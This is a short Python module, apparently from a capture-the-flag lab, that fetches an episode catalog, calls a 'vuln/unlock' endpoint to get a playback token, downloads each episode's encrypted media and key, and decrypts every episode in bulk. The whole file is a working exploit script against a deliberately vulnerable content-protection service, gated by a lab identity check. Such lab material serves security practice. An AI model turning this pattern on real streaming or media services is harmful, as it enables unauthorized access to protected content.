from __future__ import annotations

import requests

from .config import lab_request_headers
from .controller import verify_lab_identity
from .ctf_lab import decrypt_episode


def fetch_ctf_catalog(base_url: str) -> dict:
    base_url = verify_lab_identity(base_url)
    response = requests.get(
        f"{base_url}/ctf/catalog",
        headers=lab_request_headers(),
        timeout=15,
    )
    response.raise_for_status()
    return response.json()


def exploit_lab_episode(base_url: str, episode_id: int) -> bytes:
    base_url = verify_lab_identity(base_url)

    unlock = requests.post(
        f"{base_url}/ctf/vuln/unlock/{episode_id}",
        headers=lab_request_headers(),
        timeout=15,
    )
    unlock.raise_for_status()
    token = unlock.json()["playback_token"]

    media = requests.get(
        f"{base_url}/ctf/vuln/media/{episode_id}",
        params={"token": token},
        headers=lab_request_headers(),
        timeout=15,
    )
    media.raise_for_status()

    key_response = requests.get(
        f"{base_url}/ctf/vuln/key/{episode_id}",
        params={"token": token},
        headers=lab_request_headers(),
        timeout=15,
    )
    key_response.raise_for_status()

    return decrypt_episode(
        episode_id,
        media.content,
        key_response.json()["key_b64"],
    )


def exploit_all_lab_episodes(base_url: str) -> list[tuple[dict, bytes]]:
    catalog = fetch_ctf_catalog(base_url)
    recovered: list[tuple[dict, bytes]] = []

    for episode in catalog["episodes"]:
        data = exploit_lab_episode(base_url, int(episode["id"]))
        recovered.append((episode, data))

    return recovered
